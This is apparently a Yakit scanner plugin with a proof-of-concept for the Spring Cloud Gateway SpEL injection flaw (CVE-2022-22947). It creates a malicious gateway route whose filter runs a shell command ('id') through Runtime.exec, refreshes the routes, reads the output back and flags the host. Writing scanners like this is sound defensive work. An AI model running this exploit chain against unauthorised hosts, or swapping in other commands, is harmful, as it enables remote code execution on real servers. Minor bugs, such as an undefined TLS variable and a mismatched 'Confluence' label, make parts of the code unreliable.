# port scan plugin
log.setLevel("info")
yakit.AutoInitYakit()
//Spring Cloud Gateway Actuator API SpEL表达式注入命令执行漏洞
//Spring_Cloud_CVE-2022-22947_poc.yak

handleCheck1 = func(target, port){
    addr1 = str.HostPort(target, port)
    isTls1 = str.IsTLSServer(addr1)

    packet1 = `POST /actuator/gateway/routes/hacktest HTTP/1.1
Host: {{params(target)}}
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 329

{
  "id": "hacktest",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
    }
  }],
  "uri": "http://example.com"
}`
    _,_,_ = poc.HTTP(packet1, 
    poc.params({"target":addr1}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    return

}

handleCheck2 = func(target,port){
    addr2 = str.HostPort(target, port)
    isTls2 = str.IsTLSServer(addr2)

    packet2 = `POST /actuator/gateway/refresh HTTP/1.1
Host: {{params(target)}}
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0`
    _,_,_ = poc.HTTP(packet2, 
    poc.params({"target":addr2}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    return

}


handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `GET /actuator/gateway/routes/hacktest HTTP/1.1
Host: {{params(target)}}
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
`

    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    // dump(rsp)
    if len(rsp) > 0 {
        header, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
        reg = re.MustCompile(`Result(.*)'],`)
        if reg == nil {
            log.info("正则解析失败")
            yakit.Error("正则解析失败")
            return
        }

        //提取关键字
        res = reg.FindAllStringSubmatch(string(body), -1)[0][1]
        log.info("[id] 命令执行结果：%v", res)
        if str.MatchAllOfSubString(header, "HTTP/1.1 200 OK") && str.MatchAllOfSubString(res, "uid=") {
            yakit.Info("%v found Spring Cloud Gateway Actuator API SpEL表达式注入命令执行(CVE-2022-22947)漏洞", addr)
            risk.NewRisk(
            addr,risk.title("CVE-2022-22947"),
            risk.severity("high"),
            risk.titleVerbose("Spring Cloud Gateway Actuator API SpEL表达式注入命令执行(CVE-2022-22947)漏洞"),
            risk.type("rce[Confluence]"),
            risk.payload(`"value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"`),
        )
        }
       
    }

    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck1(result.Target,result.Port)
        handleCheck2(result.Target,result.Port)
        handleCheck(result.Target,result.Port)
    }
    
}
